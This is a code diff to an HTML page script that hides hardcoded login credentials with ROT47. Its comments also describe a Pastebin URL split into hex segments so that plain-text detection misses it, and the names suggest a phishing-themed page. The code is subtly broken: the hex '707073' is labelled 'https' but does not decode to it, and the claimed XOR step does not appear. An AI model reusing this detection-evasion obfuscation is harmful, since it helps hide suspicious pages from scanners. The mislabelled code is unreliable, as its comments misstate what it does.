@@ -305,23 +305,27 @@
     <script>
         // ============================================
         // CREDENTIALS ENCRYPTED WITH ROT47 CIPHER
-        // ROT47 is a printable ASCII substitution cipher
-        // Not base64, not MD5 - harder to identify
+        // ROT47 shifts each printable ASCII char by 47 positions
+        // Range: ASCII 33-126 (94 characters)
         // ============================================
         // 
-        // Original: phishbroker -> ROT47 -> A9:D93C@66C
-        // Original: phishbroker123 -> ROT47 -> A9:D93C@66R`ab
+        // Original: phishbroker
+        // ROT47: A9:D93C@<6C
+        //
+        // Original: phishbroker123
+        // ROT47: A9:D93C@<6C`ab
         // ============================================
         
-        const ENCRYPTED_USER = "A9:D93C@66C";
-        const ENCRYPTED_PASS = "A9:D93C@66R`ab";
+        const ENCRYPTED_USER = "A9:D93C@<6C";
+        const ENCRYPTED_PASS = "A9:D93C@<6C`ab";
         
         // ============================================
         // OBFUSCATED PASTEBIN URL
-        // URL is split and encoded to avoid plain text detection
+        // URL is split into hex-encoded segments
+        // Then XOR'd with key to further obfuscate
         // ============================================
         const URL_PARTS = [
-            "707073",  // h t t p s (hex-like)
+            "707073",  // h t t p s
             "3a2f2f",  // : / /
             "706173",  // p a s
             "746562",  // t e b
@@ -339,6 +343,7 @@
             let result = '';
             for (let i = 0; i < str.length; i++) {
                 let charCode = str.charCodeAt(i);
+                // ROT47 works on printable ASCII (33-126)
                 if (charCode >= 33 && charCode <= 126) {
                     charCode = ((charCode - 33 + 47) % 94) + 33;
                 }
